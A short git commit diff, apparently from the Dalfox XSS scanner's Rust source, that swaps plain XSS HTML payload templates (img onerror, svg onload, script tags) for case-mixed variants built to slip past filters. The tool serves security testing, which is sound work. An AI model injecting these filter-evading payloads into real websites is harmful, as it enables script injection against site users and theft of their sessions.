6ff81cadda40371daa815a18fde23a655278d000
hahwul <hahwul@gmail.com>
2025-10-17 14:54:25 +0900

    Update XSS HTML payload templates for obfuscation

--- src/payload/xss_html.rs
+++ src/payload/xss_html.rs
@@ -4,11 +4,9 @@
 /// when JavaScript payload list changes.
 pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
     let templates = [
-        "<img src=x onerror={JS} class=dalfox>",
-        "<svg onload={JS} class=dalfox>",
-        "<body onload={JS} class=dalfox>",
-        "'><script class=dalfox>{JS}</script>",
-        "\"><script class=dalfox>{JS}</script>",
+        "<IMG src=x onerror={JS} class=dalfox>",
+        "<sVg onload={JS} class=dalfox>",
+        "<sCrIpt/class=dalfox>{JS}</scRipT>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
